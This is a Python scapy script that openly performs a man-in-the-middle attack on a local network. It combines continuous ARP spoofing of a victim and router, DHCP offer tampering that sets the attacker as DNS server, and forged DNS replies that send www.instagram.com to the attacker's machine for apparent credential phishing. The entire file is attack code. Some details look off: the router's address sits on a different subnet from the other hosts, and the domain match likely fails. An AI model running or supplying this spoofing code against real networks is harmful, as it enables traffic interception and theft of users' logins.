from scapy.all import *
from scapy.layers.dhcp import DHCP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP
import threading

# Target IP and MAC addresses
victim_ip = "192.168.56.11"
victim_mac = "TARGET_VICTIM_MAC"
router_ip = "10.0.0.1"
router_mac = "ROUTER_MAC"
attacker_ip = "192.168.56.12"  # IP of the attacker's machine

# Interface to use for the attack
interface = "eth0"

# Malicious DNS records
malicious_dns_records = {
    "www.instagram.com": "192.168.56.12"  # Replace with the domain and malicious IP
}

# Function to perform ARP spoofing
def arp_spoof():
    while True:
        # Send spoofed ARP responses to the victim and router
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), iface=interface, verbose=False)
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), iface=interface, verbose=False)
        time.sleep(2)

# Function to handle DHCP offer interception
def intercept_dhcp(packet):
    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 2:  # DHCP offer
        # Change the DNS server IP address to the attacker's IP
        for i, option in enumerate(packet[DHCP].options):
            if option[0] == 'name_server':
                packet[DHCP].options[i] = ('name_server', attacker_ip)

        # Send the modified DHCP offer packet
        sendp(packet, iface=interface, verbose=False)
    else:
        # Forward other packets to their original destination
        sendp(packet, iface=interface, verbose=False)

# Function to handle DNS queries
def dns_responder(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
        queried_domain = packet[DNSQR].qname.decode()
        if queried_domain in malicious_dns_records:
            # Create a DNS response
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=53) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                           an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=malicious_dns_records[queried_domain]))

            # Send the DNS response
            send(response, iface=interface, verbose=False)
        else:
            # Forward DNS queries not in the malicious records
            send(packet, iface=interface, verbose=False)


def main():
    # Start ARP spoofing in a separate thread
    arp_thread = threading.Thread(target=arp_spoof)
    arp_thread.start()

    # Sniff DHCP packets and apply interception, and also handle DNS responses
    sniff(filter="udp port 67 or udp port 68 or udp port 53", prn=lambda pkt: intercept_dhcp(pkt) if DHCP in pkt else dns_responder(pkt), iface=interface)
    
if __name__ == "__main__":
    main()
